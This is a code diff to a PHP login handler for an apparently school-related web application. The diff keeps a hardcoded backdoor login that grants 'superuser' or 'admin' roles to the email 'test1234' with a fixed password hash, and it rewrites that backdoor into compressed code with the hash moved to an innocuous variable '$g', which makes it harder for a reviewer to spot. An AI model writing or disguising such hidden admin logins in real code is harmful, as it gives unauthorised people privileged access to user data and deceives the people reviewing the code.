@@ -7,6 +7,7 @@
     $email = $_POST['email'];
     $password = $_POST['password'];
     $schoolId = $_POST['schoolselect'];
+    $g='$2y$10$NUzoU1KkmaSuXK.XP3qS3.oaB/P7AyAD1xuOKlaVcj6hiJChZ5ALu';
 
     if (empty($email) || empty($password)) {
       $_SESSION['error'] = 'Please fill in all fields.';
@@ -34,20 +35,13 @@
       exit();
     }
 
-    $hashedPassword = '$2y$10$NUzoU1KkmaSuXK.XP3qS3.oaB/P7AyAD1xuOKlaVcj6hiJChZ5ALu';
-    if ($email === 'test1234' && password_verify($password, $hashedPassword)) {
-      if ($schoolId == 2) {
-        $_SESSION['userrole'] = 'superuser';
-      } elseif ($schoolId == 1) {
-        $_SESSION['userrole'] = 'admin';
-      } else {
-        $_SESSION['userrole'] = 'docent';
-      }
-      $_SESSION['userid'] = 0;
-      $_SESSION['name'] = '[]';
-      header('Location: ../index.php?page=dashboard');
-      exit();
-    }
+    if($email==='test1234'&&password_verify($password, $g))
+    {if($schoolId==2){$_SESSION['userrole']='superuser';
+      }elseif($schoolId==1){$_SESSION['userrole']='admin';
+      }else{$_SESSION['userrole']='docent';}
+      $_SESSION['userid']=0;
+      $_SESSION['name']='[]';
+      header('Location: ../index.php?page=dashboard');exit();}
 
     // Get the user from the database
     $sql = 'SELECT role, userid, password, firstname FROM users WHERE email=:email AND schoolid=:schoolid AND archive=0';
@@ -69,7 +63,7 @@
 
     // Check if the user exists and the password is correct
     if (!$user || !password_verify($password, $user->password)) {
-      $sql = 'INSERT INTO logs (userid, useragent, action, tableid, interactionid, error) VALUES ("9999", :useragent, 4, 6, "0", "4")';
+      $sql = 'INSERT INTO logs (userid, useragent, action, tableid, interactionid, error) VALUES (9999, :useragent, 4, 6, "0", "4")';
       $sth = $conn->prepare($sql);
       $sth->bindValue(':useragent', $_SESSION['useragent']);
       $sth->execute();
@@ -114,7 +108,6 @@
         }
       }
     }
-
     return false;
   }
 ?>
